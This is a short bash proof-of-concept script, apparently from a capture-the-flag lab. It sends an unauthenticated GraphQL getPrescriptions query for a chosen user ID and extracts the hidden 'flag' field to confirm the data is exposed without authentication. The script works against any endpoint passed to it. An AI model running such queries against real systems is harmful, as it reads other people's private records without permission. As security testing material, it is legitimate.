#!/bin/bash

# POC: Sensitive Data Exposure - Flag Field Accessible Without Authentication
# This script demonstrates that sensitive flag fields containing secrets are exposed
# through the GraphQL getPrescriptions query without authentication

TARGET="${1:-http://localhost:5003}"
GRAPHQL_ENDPOINT="${TARGET}/graphql"
USER_ID="${2:-1}"

echo "[*] Testing for sensitive flag field exposure in GraphQL API"
echo "[*] Target: ${GRAPHQL_ENDPOINT}"
echo "[*] Testing userId: ${USER_ID}"
echo ""

# Simple query to retrieve prescriptions with id and flag fields
QUERY='{"query":"{ getPrescriptions(userId: '${USER_ID}') { id flag } }"}'

echo "[*] Sending unauthenticated GraphQL query..."
echo "[*] Query: ${QUERY}"
echo ""

# Execute the GraphQL query without any authentication headers
RESPONSE=$(curl -s -X POST "${GRAPHQL_ENDPOINT}" \
  -H 'Content-Type: application/json' \
  -d "${QUERY}")

echo "[*] Response received:"
echo "${RESPONSE}" | jq '.' 2>/dev/null || echo "${RESPONSE}"
echo ""

# Check if we got data with flag fields
if echo "${RESPONSE}" | grep -q '"flag"'; then
    echo "[+] SUCCESS: Flag field found in response!"
    
    # Extract flag values
    FLAGS=$(echo "${RESPONSE}" | jq -r '.data.getPrescriptions[]? | select(.flag != null) | .flag' 2>/dev/null)
    
    if [ ! -z "${FLAGS}" ]; then
        echo "[+] Extracted flag values:"
        echo "${FLAGS}"
        echo ""
        echo "[!] VULNERABILITY CONFIRMED: Sensitive flag data is exposed without authentication"
        exit 0
    else
        # Check if there's data but no flags
        if echo "${RESPONSE}" | grep -q '"id"'; then
            echo "[*] Prescriptions returned but no flag field found"
            exit 1
        fi
    fi
else
    echo "[-] No flag field found or query returned error"
    echo "${RESPONSE}"
    exit 1
fi